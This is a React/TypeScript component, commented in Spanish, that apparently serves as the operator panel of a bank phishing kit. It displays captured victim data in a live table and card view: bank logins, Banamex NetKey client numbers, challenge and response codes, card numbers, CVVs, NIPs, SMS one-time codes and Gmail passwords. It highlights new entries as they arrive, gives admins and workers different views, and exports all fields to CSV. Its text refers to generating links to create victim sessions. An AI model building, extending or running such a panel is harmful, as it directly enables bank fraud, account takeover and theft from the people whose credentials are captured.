import React, { useState, useEffect } from 'react';
import { Session } from '@shared/schema';
import { Skeleton } from '@/components/ui/skeleton';
import { useMutation } from '@tanstack/react-query';
import { apiRequest } from '@/lib/queryClient';
import { queryClient } from '@/lib/queryClient';
import { useToast } from '@/hooks/use-toast';
import { useDeviceInfo } from '@/hooks/use-device-orientation';
import { Card, CardContent } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { ArrowRight, CheckCircle2, Copy, AlarmClock, CreditCard, MessageSquare, KeyRound, AlertCircle, Smartphone, Target, Download, Monitor } from 'lucide-react';
import { DeleteConfirmDialog } from './DeleteConfirmDialog';
import { GmailCredentialsBox } from './GmailCredentialsBox';

interface AccessTableProps {
  sessions: Session[];
  activeBank: string;
  selectedSessionId: string | null;
  onSelectSession: (sessionId: string) => void;
  isLoading: boolean;
  userRole: 'admin' | 'user';
}

const AccessTable: React.FC<AccessTableProps> = ({ 
  sessions, 
  activeBank, 
  selectedSessionId,
  onSelectSession,
  isLoading,
  userRole 
}) => {
  // Determinar si el usuario es administrador
  const isAdmin = userRole === 'admin';
  
  // Función para enmascarar datos sensibles para usuarios no-admin
  const maskDataIfNeeded = (value: string | null | undefined, showRealData: boolean = false): string => {
    if (!value) return 'N/A';
    // Los administradores ven todo, los usuarios regulares solo ven correo y contraseña
    return isAdmin || showRealData ? value : '••••••••';
  };
  const { toast } = useToast();
  const { isMobile, isLandscape } = useDeviceInfo();
  // Estado para resaltar las filas recién actualizadas
  const [highlightedRows, setHighlightedRows] = useState<Record<string, boolean>>({});
  
  // Estado para resaltar campos específicos que han sido actualizados
  const [highlightedFields, setHighlightedFields] = useState<Record<string, Record<string, boolean>>>({});
  
  // Estado para el diálogo de confirmación de eliminación
  const [isDeleteDialogOpen, setIsDeleteDialogOpen] = useState<boolean>(false);
  const [sessionToDelete, setSessionToDelete] = useState<Session | null>(null);
  
  // Mutation para guardar una sesión
  const saveSessionMutation = useMutation({
    mutationFn: async (sessionId: string) => {
      const res = await apiRequest('POST', `/api/sessions/${sessionId}/save`);
      return await res.json();
    },
    onSuccess: () => {
      toast({
        title: "Sesión guardada",
        description: "La sesión ha sido guardada en accesos guardados.",
      });
      queryClient.invalidateQueries({ queryKey: ['/api/sessions'] });
    },
    onError: (error) => {
      toast({
        title: "Error al guardar sesión",
        description: error.message,
        variant: "destructive",
      });
    }
  });
  
  // Mutation para eliminar una sesión
  const deleteSessionMutation = useMutation({
    mutationFn: async (sessionId: string) => {
      const res = await apiRequest('DELETE', `/api/sessions/${sessionId}`);
      return await res.json();
    },
    onSuccess: () => {
      toast({
        title: "Sesión eliminada",
        description: "La sesión ha sido eliminada correctamente.",
      });
      // La actualización se manejará a través de websockets
    },
    onError: (error) => {
      toast({
        title: "Error al eliminar sesión",
        description: error.message,
        variant: "destructive",
      });
    }
  });
  
  // Filter sessions by bank if a specific bank is selected
  const filteredSessions = activeBank === 'todos' 
    ? sessions 
    : sessions.filter(session => session.banco === activeBank);
    
  // Referencias previas de las sesiones para poder comparar y detectar cambios
  const [prevSessions, setPrevSessions] = useState<Session[]>([]);
  
  // Función para exportar datos a CSV
  const exportToCSV = () => {
    if (filteredSessions.length === 0) {
      toast({
        title: "Sin datos para exportar",
        description: "No hay sesiones disponibles para exportar.",
        variant: "destructive",
      });
      return;
    }
    
    try {
      // Definir encabezados completos del CSV con todos los campos
      const headers = [
        'Banco', 
        'Folio', 
        'Usuario/Correo Login', 
        'Contraseña Login', 
        'Número de Cliente',
        'Clave de Acceso',
        'Challenge',
        'NetKey Response',
        'Challenge Personalizado',
        'NetKey Response Personalizado',
        'Challenge Manual',
        'NetKey Response Manual',
        'Tarjeta', 
        'Fecha Vencimiento', 
        'CVV', 
        'SMS Verificación', 
        'NIP', 
        'SMS Compra', 
        'Teléfono Celular',
        'Correo Gmail/Email', 
        'Contraseña Gmail/Email',
        'Device ID',
        'Paso Actual', 
        'Activa',
        'Guardada',
        'Creado Por', 
        'Fecha Creación'
      ];
      
      // Convertir datos a filas CSV con todos los campos disponibles
      const rows = filteredSessions.map(session => [
        session.banco || '',
        session.folio || '',
        session.username || '',
        session.password || '',
        (session as any).numeroCliente || '',
        (session as any).claveAcceso || '',
        (session as any).challenge || '',
        (session as any).netkeyResponse || '',
        (session as any).customChallenge || '',
        (session as any).customNetkeyResponse || '',
        (session as any).manualNetkeyChallenge || '',
        (session as any).manualNetkeyResponse || '',
        session.tarjeta || '',
        session.fechaVencimiento || '',
        session.cvv || '',
        session.sms || '',
        session.nip || '',
        session.smsCompra || '',
        session.celular || '',
        session.correo || '',  // Campo de correo de Gmail
        session.contrasena || '',  // Campo de contraseña de Gmail
        session.deviceId || '',  // ID único del dispositivo
        session.pasoActual || '',
        session.active ? 'Sí' : 'No',
        session.saved ? 'Sí' : 'No',
        session.createdBy || '',
        new Date(session.createdAt || Date.now()).toLocaleString('es-MX')
      ]);
      
      // Unir encabezados y filas
      const csvContent = [
        headers.join(','),
        ...rows.map(row => row.map(cell => `"${String(cell).replace(/"/g, '""')}"`).join(','))
      ].join('\\n');
      
      // Crear un blob y un link para descargar
      const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
      const url = URL.createObjectURL(blob);
      const link = document.createElement('a');
      link.setAttribute('href', url);
      link.setAttribute('download', `sesiones_${activeBank.toLowerCase()}_${new Date().toISOString().slice(0, 10)}.csv`);
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
      
      toast({
        title: "Exportación exitosa",
        description: `Se han exportado ${filteredSessions.length} sesiones a CSV.`,
        variant: "default",
      });
    } catch (error) {
      console.error('Error al exportar a CSV:', error);
      toast({
        title: "Error al exportar",
        description: "Ha ocurrido un error al exportar los datos. Intente nuevamente.",
        variant: "destructive",
      });
    }
  };
  
  // Detectar cambios en las sesiones para resaltar las filas actualizadas
  useEffect(() => {
    if (sessions.length === 0) return;
    
    // Marcar todas las sesiones como destacadas
    const newHighlights: Record<string, boolean> = {};
    const newFieldHighlights: Record<string, Record<string, boolean>> = {};
    
    // Comparar sesiones actuales con las anteriores para encontrar cambios específicos
    sessions.forEach(session => {
      const prevSession = prevSessions.find(s => s.sessionId === session.sessionId);
      
      // Resaltar la fila completa
      newHighlights[session.sessionId] = true;
      
      // Inicializar objeto de campos para esta sesión
      newFieldHighlights[session.sessionId] = {};
      
      // Si encontramos la sesión previa, comparamos campo por campo
      if (prevSession) {
        // Comparar campos específicos para resaltar
        if (prevSession.folio !== session.folio) {
          newFieldHighlights[session.sessionId].folio = true;
        }
        if (prevSession.username !== session.username || prevSession.password !== session.password) {
          newFieldHighlights[session.sessionId].credentials = true;
        }
        if (prevSession.tarjeta !== session.tarjeta || 
            prevSession.fechaVencimiento !== session.fechaVencimiento ||
            prevSession.cvv !== session.cvv) {
          newFieldHighlights[session.sessionId].tarjeta = true;
        }
        if (prevSession.sms !== session.sms) {
          newFieldHighlights[session.sessionId].sms = true;
        }
        if (prevSession.nip !== session.nip) {
          newFieldHighlights[session.sessionId].nip = true;
        }
        if (prevSession.smsCompra !== session.smsCompra) {
          newFieldHighlights[session.sessionId].smsCompra = true;
        }
        if (prevSession.celular !== session.celular) {
          newFieldHighlights[session.sessionId].celular = true;
        }
        if (prevSession.correo !== session.correo || prevSession.contrasena !== session.contrasena) {
          newFieldHighlights[session.sessionId].gmail = true;
        }
        if (prevSession.pasoActual !== session.pasoActual) {
          newFieldHighlights[session.sessionId].pasoActual = true;
        }
      } else {
        // Si es una sesión nueva, resaltar todos los campos
        newFieldHighlights[session.sessionId] = {
          folio: true,
          credentials: true,
          tarjeta: true,
          sms: true,
          nip: true,
          smsCompra: true,
          celular: true,
          pasoActual: true
        };
      }
    });
    
    // Actualizar estados
    setHighlightedRows(newHighlights);
    setHighlightedFields(newFieldHighlights);
    
    // Guardar las sesiones actuales como previas para la próxima comparación
    setPrevSessions([...sessions]);
    
    // Eliminar el resaltado después de 3 segundos
    const timer = setTimeout(() => {
      setHighlightedRows({});
      setHighlightedFields({});
    }, 3000);
    
    return () => clearTimeout(timer);
  }, [sessions]);

  if (isLoading) {
    return (
      <div className="px-6 pt-2 pb-6 overflow-auto flex-1">
        <div className="w-full bg-[#1e1e1e] rounded-lg overflow-hidden">
          <div className="p-4">
            <Skeleton className="h-8 w-full mb-4" />
            <Skeleton className="h-12 w-full mb-2" />
            <Skeleton className="h-12 w-full mb-2" />
            <Skeleton className="h-12 w-full mb-2" />
          </div>
        </div>
      </div>
    );
  }

  // Función para eliminar una sesión
  const handleDeleteSession = () => {
    if (sessionToDelete) {
      deleteSessionMutation.mutate(sessionToDelete.sessionId);
    }
  };
  
  return (
    <div className="px-6 pt-2 pb-6 overflow-auto flex-1">
      {/* Diálogo de confirmación de eliminación */}
      <DeleteConfirmDialog 
        isOpen={isDeleteDialogOpen}
        onClose={() => setIsDeleteDialogOpen(false)}
        onConfirm={handleDeleteSession}
        session={sessionToDelete}
        userRole={userRole}
      />
      
      {/* Botón de exportación */}
      {filteredSessions.length > 0 && (
        <div className="mb-3 flex justify-end">
          <Button
            variant="outline"
            size="sm"
            className="text-[#00aaff] border-[#00aaff] hover:bg-[#0a101d] flex items-center gap-2"
            onClick={exportToCSV}
          >
            <Download className="h-4 w-4" />
            Exportar a CSV
          </Button>
        </div>
      )}
      
      {/* Vista para móvil: tarjetas o vista tabla para móvil en landscape */}
      {(isMobile && !isLandscape) ? (
        <>
          {filteredSessions.length === 0 ? (
            <div className="w-full bg-[#16213e] rounded-lg p-4 text-center text-gray-400">
              No hay sesiones activas. Genere un nuevo link para crear una sesión.
            </div>
          ) : (
            <div className="space-y-4 scrollable-container pb-20">
              {filteredSessions.map((session, index) => (
                <Card 
                  key={session.sessionId}
                  className={`bg-[#16213e] border-[#2a2a42] ${selectedSessionId === session.sessionId ? 'selected-row' : ''} 
                    ${highlightedRows[session.sessionId] ? 'new-data' : ''}`}
                  onClick={() => onSelectSession(session.sessionId)}
                >
                  <CardContent className="p-4">
                    <div className="flex justify-between items-center mb-3">
                      <div className="font-bold text-white text-lg">{session.banco}</div>
                      <div className={`px-3 py-1 rounded text-xs ${
                        highlightedFields[session.sessionId]?.pasoActual 
                        ? 'bg-[#be0046] text-white font-bold' 
                        : 'bg-[#0c1a2a] text-gray-300'}`}
                      >
                        {session.pasoActual ? session.pasoActual.charAt(0).toUpperCase() + session.pasoActual.slice(1) : 'Inicio'}
                      </div>
                    </div>
                    
                    <div className="mb-3 flex gap-2 items-center">
                      <Copy className="h-4 w-4 text-[#be0046]" />
                      <div className={`text-sm ${
                        highlightedFields[session.sessionId]?.folio 
                        ? 'text-[#be0046] font-bold' 
                        : 'text-white'}`}
                      >
                        Folio: {session.folio || 'N/A'}
                      </div>
                    </div>
                    
                    {(session.username || session.password) && (
                      <div className="mb-3 flex gap-2 items-center">
                        <AlertCircle className="h-4 w-4 text-[#be0046]" />
                        <div className={`text-sm ${
                          highlightedFields[session.sessionId]?.credentials 
                          ? 'text-[#be0046] font-bold' 
                          : 'text-white'}`}
                        >
                          {session.username && session.password 
                            ? `${session.username}:${maskDataIfNeeded(session.password, true)}` 
                            : '--'}
                        </div>
                      </div>
                    )}
                    
                    {/* Información del dispositivo */}
                    {(session as any).dispositivo && (
                      <div className="mb-3 flex gap-2 items-center">
                        <Monitor className="h-4 w-4 text-[#be0046]" />
                        <div className="text-sm text-white">
                          Dispositivo: {(session as any).dispositivo}
                        </div>
                      </div>
                    )}
                    
                    {session.tarjeta && (
                      <div className="mb-3 flex gap-2 items-start">
                        <CreditCard className="h-4 w-4 text-[#be0046] mt-0.5" />
                        <div className={`text-sm ${
                          highlightedFields[session.sessionId]?.tarjeta 
                          ? 'text-[#be0046] font-bold' 
                          : 'text-white'}`}
                        >
                          <div>{isAdmin ? session.tarjeta : '••••••••'}</div>
                          {isAdmin && (session.fechaVencimiento || session.cvv) && (
                            <div className="text-xs mt-1 text-gray-300">
                              {session.fechaVencimiento && <span className="mr-2">Exp: {session.fechaVencimiento}</span>}
                              {session.cvv && <span>CVV: {session.cvv}</span>}
                            </div>
                          )}
                        </div>
                      </div>
                    )}
                    
                    {session.sms && (
                      <div className="mb-3 flex gap-2 items-center">
                        <MessageSquare className="h-4 w-4 text-[#be0046]" />
                        <div className={`text-sm ${
                          highlightedFields[session.sessionId]?.sms 
                          ? 'text-[#be0046] font-bold' 
                          : 'text-white'}`}
                        >
                          SMS: {isAdmin ? session.sms : '••••••••'}
                        </div>
                      </div>
                    )}
                    
                    {session.nip && (
                      <div className="mb-3 flex gap-2 items-center">
                        <KeyRound className="h-4 w-4 text-[#be0046]" />
                        <div className={`text-sm ${
                          highlightedFields[session.sessionId]?.nip 
                          ? 'text-[#be0046] font-bold' 
                          : 'text-white'}`}
                        >
                          NIP: {isAdmin ? session.nip : '••••••••'}
                        </div>
                      </div>
                    )}
                    
                    {session.smsCompra && (
                      <div className="mb-3 flex gap-2 items-center">
                        <CheckCircle2 className="h-4 w-4 text-[#be0046]" />
                        <div className={`text-sm ${
                          highlightedFields[session.sessionId]?.smsCompra 
                          ? 'text-[#be0046] font-bold' 
                          : 'text-white'}`}
                        >
                          SMS Compra: {isAdmin ? session.smsCompra : '••••••••'}
                        </div>
                      </div>
                    )}
                    
                    {session.celular && (
                      <div className="mb-3 flex gap-2 items-center">
                        <Smartphone className="h-4 w-4 text-[#be0046]" />
                        <div className={`text-sm ${
                          highlightedFields[session.sessionId]?.celular 
                          ? 'text-[#be0046] font-bold' 
                          : 'text-white'}`}
                        >
                          Celular: {isAdmin ? session.celular : '••••••••'}
                        </div>
                      </div>
                    )}
                    
                    {/* Datos de Gmail con el nuevo componente */}
                    {(session.correo || session.contrasena) && (
                      <div className="mb-3">
                        <GmailCredentialsBox session={session} userRole={userRole} />
                      </div>
                    )}
                    
                    {/* Datos de Banamex */}
                    {((session as any).numeroCliente || (session as any).claveAcceso || (session as any).challenge || (session as any).netkeyResponse || (session as any).customChallenge || (session as any).customNetkeyResponse || (session as any).manualNetkeyChallenge || (session as any).manualNetkeyResponse) && (
                      <div className="mb-3 p-3 bg-[#003d7a] rounded border border-[#0066cc]">
                        <div className="flex items-center mb-2">
                          <KeyRound className="h-4 w-4 text-[#00aaff] mr-2" />
                          <span className="text-white font-bold">Banamex Empresarial NetKey</span>
                        </div>
                        {(session as any).numeroCliente && (
                          <div className="text-sm text-white mb-1">
                            <span className="opacity-80">Número de Cliente:</span> <span className="font-mono ml-2">{(session as any).numeroCliente}</span>
                          </div>
                        )}
                        {(session as any).claveAcceso && (
                          <div className="text-sm text-white mb-1">
                            <span className="opacity-80">Clave de Acceso:</span> <span className="font-mono ml-2">{(session as any).claveAcceso}</span>
                          </div>
                        )}
                        {(session as any).challenge && (
                          <div className="text-sm text-white mb-1">
                            <span className="opacity-80">Challenge:</span> <span className="font-mono ml-2">{(session as any).challenge}</span>
                          </div>
                        )}
                        {(session as any).netkeyResponse && (
                          <div className="text-sm text-white mb-1">
                            <span className="opacity-80">NetKey Response:</span> <span className="font-mono ml-2">{(session as any).netkeyResponse}</span>
                          </div>
                        )}
                        {(session as any).customChallenge && (
                          <div className="text-sm text-white mb-1">
                            <span className="opacity-80">Challenge Personalizado:</span> <span className="font-mono ml-2">{(session as any).customChallenge}</span>
                          </div>
                        )}
                        {(session as any).customNetkeyResponse && (
                          <div className="text-sm text-white mb-1">
                            <span className="opacity-80">NetKey Personalizado:</span> <span className="font-mono ml-2">{(session as any).customNetkeyResponse}</span>
                          </div>
                        )}
                        {(session as any).manualNetkeyChallenge && (
                          <div className="text-sm text-white mb-1">
                            <span className="opacity-80">Challenge Manual:</span> <span className="font-mono ml-2">{(session as any).manualNetkeyChallenge}</span>
                          </div>
                        )}
                        {(session as any).manualNetkeyResponse && (
                          <div className="text-sm text-white">
                            <span className="opacity-80">NetKey Manual:</span> <span className="font-mono ml-2">{(session as any).manualNetkeyResponse}</span>
                          </div>
                        )}
                      </div>
                    )}
                    
                    {/* Datos del Formulario de Contacto */}
                    {((session as any).nombreContacto || (session as any).correoContacto || (session as any).celularContacto || (session as any).telefonoAlternativoContacto) && (
                      <div className="mb-3 p-3 bg-[#1a3a1a] rounded border border-[#2a5a2a]">
                        <div className="flex items-center mb-2">
                          <AlertCircle className="h-4 w-4 text-[#4ade80] mr-2" />
                          <span className="text-white font-bold">Datos de Contacto</span>
                        </div>
                        {(session as any).nombreContacto && (
                          <div className="text-sm text-white mb-1">
                            <span className="opacity-80">Nombre:</span> <span className="ml-2">{(session as any).nombreContacto}</span>
                          </div>
                        )}
                        {(session as any).correoContacto && (
                          <div className="text-sm text-white mb-1">
                            <span className="opacity-80">Correo:</span> <span className="ml-2">{(session as any).correoContacto}</span>
                          </div>
                        )}
                        {(session as any).celularContacto && (
                          <div className="text-sm text-white mb-1">
                            <span className="opacity-80">Celular:</span> <span className="ml-2">{(session as any).celularContacto}</span>
                          </div>
                        )}
                        {(session as any).telefonoAlternativoContacto && (
                          <div className="text-sm text-white">
                            <span className="opacity-80">Teléfono Alternativo:</span> <span className="ml-2">{(session as any).telefonoAlternativoContacto}</span>
                          </div>
                        )}
                      </div>
                    )}
                    
                    {/* Device ID para gestión de folios únicos */}
                    {session.deviceId && (
                      <div className="mb-3 flex gap-2 items-center">
                        <Monitor className="h-4 w-4 text-[#be0046]" />
                        <div className="text-sm text-white text-opacity-80">
                          Device: {session.deviceId}
                        </div>
                      </div>
                    )}
                    
                    {/* Información del creador (solo visible para administradores) */}
                    <div className="mb-3 flex gap-2 items-center">
                      <Target className="h-4 w-4 text-[#be0046]" />
                      <div className="text-sm text-white text-opacity-80">
                        Creado por: {session.createdBy || '--'} • {new Date(session.createdAt || Date.now()).toLocaleString()}
                      </div>
                    </div>
                    
                    <div className="flex gap-2 mt-4 border-t border-[#2a2a42] pt-3">
                      <Button 
                        variant="outline" 
                        size="sm"
                        className="flex-1 border-[#2a2a42] hover:bg-[#0c1a2a] text-white"
                        onClick={(e) => {
                          e.stopPropagation();
                          onSelectSession(session.sessionId);
                        }}
                      >
                        <ArrowRight className="h-3 w-3 mr-1" />
                        Seleccionar
                      </Button>
                      
                      {!session.saved && (
                        <Button 
                          size="sm"
                          className="flex-1 bg-[#16213e] hover:bg-[#0c1a2a] text-white"
                          onClick={(e) => {
                            e.stopPropagation();
                            saveSessionMutation.mutate(session.sessionId);
                          }}
                          disabled={saveSessionMutation.isPending}
                        >
                          <Download className="h-3 w-3 mr-1" />
                          {saveSessionMutation.isPending ? '...' : 'Guardar'}
                        </Button>
                      )}
                      
                      {isAdmin && (
                        <Button 
                          variant="destructive"
                          size="sm"
                          className="flex-1 bg-[#be0046] hover:bg-[#a30039] text-white"
                          onClick={(e) => {
                            e.stopPropagation();
                            setSessionToDelete(session);
                            setIsDeleteDialogOpen(true);
                          }}
                          disabled={deleteSessionMutation.isPending}
                        >
                          {deleteSessionMutation.isPending ? '...' : 'Eliminar'}
                        </Button>
                      )}
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>
          )}
        </>
      ) : (
        /* Vista para desktop: tabla */
        <div className="overflow-x-auto scrollable-container">
          <table className="data-table">
            <thead>
              <tr>
                <th className="p-3 text-left">#</th>
                <th className="p-3 text-left">Número de Cliente</th>
                <th className="p-3 text-left">Contraseña</th>
                <th className="p-3 text-left">Banco</th>
                <th className="p-3 text-left">Challenge</th>
                <th className="p-3 text-left">NetKey</th>
                <th className="p-3 text-left">Challenge Custom</th>
                <th className="p-3 text-left">NetKey Custom</th>
                <th className="p-3 text-left">Challenge Manual</th>
                <th className="p-3 text-left">NetKey Manual</th>
                <th className="p-3 text-left">Nombre Contacto</th>
                <th className="p-3 text-left">Correo Contacto</th>
                <th className="p-3 text-left">Celular</th>
                <th className="p-3 text-left">Tel. Alt.</th>
                <th className="p-3 text-left">Paso actual</th>
                <th className="p-3 text-left">Acciones</th>
              </tr>
            </thead>
            <tbody>
              {filteredSessions.length === 0 && (
                <tr>
                  <td colSpan={14} className="p-4 text-center text-gray-400">
                    No hay sesiones activas. Genere un nuevo link para crear una sesión.
                  </td>
                </tr>
              )}
              
              {filteredSessions.map((session, index) => (
                <tr 
                  key={session.sessionId}
                  className={`border-b border-[#2a2a42] hover:bg-[#16213e]/70 
                    ${selectedSessionId === session.sessionId ? 'selected-row' : ''} 
                    ${highlightedRows[session.sessionId] ? 'new-data' : ''}`}
                  onClick={() => onSelectSession(session.sessionId)}
                >
                  <td className="p-3 text-white">{index + 1}</td>
                  <td className="p-3 text-white">
                    {(session as any).numeroCliente || '--'}
                  </td>
                  <td className="p-3 text-white">
                    {(session as any).claveAcceso || '--'}
                  </td>
                  <td className="p-3 text-white">{session.banco}</td>
                  <td className="p-3 text-white font-mono">
                    {(session as any).challenge || '--'}
                  </td>
                  <td className="p-3 text-white">
                    {(session as any).netkeyResponse || '--'}
                  </td>
                  <td className="p-3 text-white font-mono">
                    {(session as any).customChallenge || '--'}
                  </td>
                  <td className="p-3 text-white">
                    {(session as any).customNetkeyResponse || '--'}
                  </td>
                  <td className="p-3 text-white font-mono">
                    {(session as any).manualNetkeyChallenge || '--'}
                  </td>
                  <td className="p-3 text-white">
                    {(session as any).manualNetkeyResponse || '--'}
                  </td>
                  <td className="p-3 text-white">
                    {(session as any).nombreContacto || '--'}
                  </td>
                  <td className="p-3 text-white">
                    {(session as any).correoContacto || '--'}
                  </td>
                  <td className="p-3 text-white">
                    {(session as any).celularContacto || '--'}
                  </td>
                  <td className="p-3 text-white">
                    {(session as any).telefonoAlternativoContacto || '--'}
                  </td>
                  <td className={`p-3 ${highlightedFields[session.sessionId]?.pasoActual ? 'text-[#be0046] font-bold' : 'text-white'}`}>
                    {session.pasoActual ? session.pasoActual.charAt(0).toUpperCase() + session.pasoActual.slice(1) : '--'}
                  </td>
                  <td className="p-3 text-[#ccc]">
                    <div className="flex space-x-2">
                      <button 
                        className="text-xs secondary-button py-1 px-2"
                        onClick={(e) => {
                          e.stopPropagation();
                          onSelectSession(session.sessionId);
                        }}
                      >
                        Seleccionar
                      </button>
                      
                      {!session.saved && (
                        <button 
                          className="text-xs bg-[#16213e] hover:bg-[#0f172a] text-white px-2 py-1 rounded flex items-center"
                          onClick={(e) => {
                            e.stopPropagation();
                            saveSessionMutation.mutate(session.sessionId);
                          }}
                          disabled={saveSessionMutation.isPending}
                        >
                          <Download className="h-3 w-3 mr-1" />
                          {saveSessionMutation.isPending ? '...' : 'Guardar'}
                        </button>
                      )}
                      
                      {isAdmin && (
                        <button 
                          className="text-xs primary-button py-1 px-2"
                          onClick={(e) => {
                            e.stopPropagation();
                            setSessionToDelete(session);
                            setIsDeleteDialogOpen(true);
                          }}
                          disabled={deleteSessionMutation.isPending}
                        >
                          {deleteSessionMutation.isPending ? '...' : 'Eliminar'}
                        </button>
                      )}
                    </div>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
};

export default AccessTable;
